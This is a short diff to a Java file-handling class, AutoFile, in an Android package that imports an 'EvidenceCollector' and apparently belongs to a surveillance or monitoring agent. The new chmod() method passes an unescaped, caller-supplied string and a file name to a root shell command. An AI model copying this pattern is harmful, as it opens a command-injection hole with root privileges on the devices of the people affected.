@@ -23,6 +23,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Execute;
 
 /**
  * The Class AutoFlashFile.
@@ -345,19 +346,16 @@ public final class AutoFile {
 		return file.getName();
 	}
 
-	/**
-	 * Flush.
-	 */
-	@Deprecated
-	public void flush() {
-
-	}
 
 	/**
 	 * Delete the file.
 	 */
-	public void delete() {
-		file.delete();
+	public boolean delete() {
+		if(file.exists()){
+			file.delete();
+			return true;
+		}
+		return false;
 	}
 
 	public boolean dropExtension(String ext) {
@@ -421,6 +419,10 @@ public final class AutoFile {
 
 	public long lastModified() {
 		return file.lastModified();
+	}
+
+	public void chmod(String string) {
+		Execute.executeRoot("chmod " + string + " " + getFilename() );
 	}
 
 }
